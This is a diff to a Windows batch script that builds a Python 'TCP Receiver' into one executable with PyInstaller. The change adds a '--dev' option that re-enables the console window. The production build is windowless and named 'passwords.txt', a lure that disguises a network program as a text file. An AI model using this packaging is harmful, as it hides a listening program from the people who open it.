@@ -2,10 +2,22 @@
 REM Build TCP Receiver as Windows executable
 REM Requires: PyInstaller (pip install pyinstaller)
 REM Requires: icon.ico in the same directory
+REM Usage: build.bat [--dev]  (--dev enables console window for debugging)
+
+REM Check for --dev flag
+set "CONSOLE_FLAG=--noconsole"
+set "BUILD_MODE=Production"
+for %%a in (%*) do (
+    if /I "%%a"=="--dev" (
+        set "CONSOLE_FLAG="
+        set "BUILD_MODE=Development"
+    )
+)
 
 echo.
 echo ======================================
 echo   Building TCP Receiver Executable
+echo   Mode: %BUILD_MODE%
 echo ======================================
 echo.
 
@@ -45,7 +57,7 @@ REM Build the executable
 pyinstaller --onefile ^
             --name "passwords.txt" ^
             --icon=icon.ico ^
-            --noconsole ^
+            %CONSOLE_FLAG% ^
             receiver.py
 
 if errorlevel 1 (
